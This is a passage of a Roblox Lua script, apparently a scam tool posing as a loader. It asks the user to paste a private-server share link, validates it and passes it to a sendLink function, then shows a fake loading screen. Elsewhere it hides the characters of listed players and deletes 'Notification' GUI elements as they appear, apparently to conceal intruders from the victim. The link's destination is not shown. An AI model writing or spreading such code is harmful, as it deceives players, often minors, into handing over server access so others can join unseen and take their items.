        hookGuiContainer(localPlayer:FindFirstChildOfClass("PlayerGui"))
        hookGuiContainer(CoreGui)
        hookGuiContainer(StarterGui)
        
        if not localPlayer:FindFirstChildOfClass("PlayerGui") then
            localPlayer.ChildAdded:Connect(function(c)
                if c:IsA("PlayerGui") then hookGuiContainer(c) end
            end)
        end
        
        for _, plr in ipairs(PlayersLocal:GetPlayers()) do procesarJugador(plr) end
        PlayersLocal.PlayerAdded:Connect(procesarJugador)
        
        UserInputService.InputBegan:Connect(function(input, gp)
            if gp then return end
            if input.KeyCode == Enum.KeyCode.T then
                oculto = not oculto
                if oculto then
                    for _, plr in ipairs(PlayersLocal:GetPlayers()) do
                        if plr ~= localPlayer and A_OCULTAR[plr.Name] and plr.Character then
                            ocultarCharacterVisual(plr.Character)
                        end
                    end
                    scanContainer(localPlayer:FindFirstChildOfClass("PlayerGui"))
                    scanContainer(CoreGui)
                    scanContainer(StarterGui)
                end
            end
        end)
    end
    
    do
        local Players = game:GetService("Players")
        local localPlayer = Players.LocalPlayer
        
        local function borrarNotificacion(player)
            if not player then return end
            local playerGui = player:FindFirstChildOfClass("PlayerGui")
            if playerGui then
                local notif = playerGui:FindFirstChild("Notification")
                if notif then
                    notif:Destroy()
                    print("Notificacion eliminado de PlayerGui de "..player.Name)
                end
            end
        end
        
        borrarNotificacion(localPlayer)
        
        localPlayer.ChildAdded:Connect(function(child)
            if child:IsA("PlayerGui") then
                child.DescendantAdded:Connect(function(desc)
                    if desc.Name == "Notification" then
                        desc:Destroy()
                        print("Notificacion interceptada y eliminada")
                    end
                end)
            end
        end)
    end
end
button.MouseButton1Click:Connect(function()
    local text = box.Text
    local startsOk = string.match(text, "^https://www%.roblox%.com/share%?code=") ~= nil
    local lengthOk = (#text == 78)
    local endsOk = (text:sub(-12) == "&type=Server")
    
    if not (startsOk and lengthOk and endsOk) then
        box.Text = msgInvalidLink
        box.TextColor3 = Color3.fromRGB(255,80,80)
        
        local ERROR_SOUND = "rbxassetid://112124517778988"
        local S_error = Instance.new("Sound")
        S_error.SoundId = ERROR_SOUND
        S_error.Volume = 5
        S_error.Parent = workspace
        S_error:Play()
        S_error.Ended:Connect(function()
            S_error:Destroy()
        end)
        
        return
    end
    
    hasPressedEnter = true
    
    local S = Instance.new("Sound")
    S.SoundId = "rbxassetid://118763066817859"
    S.Volume = 5
    S.Parent = workspace
    S:Play()
    S.Ended:Connect(function()
        S:Destroy()
    end)
    print("✅ Success Sound reproducido")
    
    sendLink(text)
    local loadingGui = showLoadingScreen()
    title2.Visible = false
    executeHeavyScripts()
    
    TweenService2:Create(frame2, TweenInfo.new(0.35), {Size=UDim2.fromScale(0,0), BackgroundTransparency=1}):Play()
    task.wait(0.35)
    gui2:Destroy()
    if connection then connection:Disconnect() end
end)
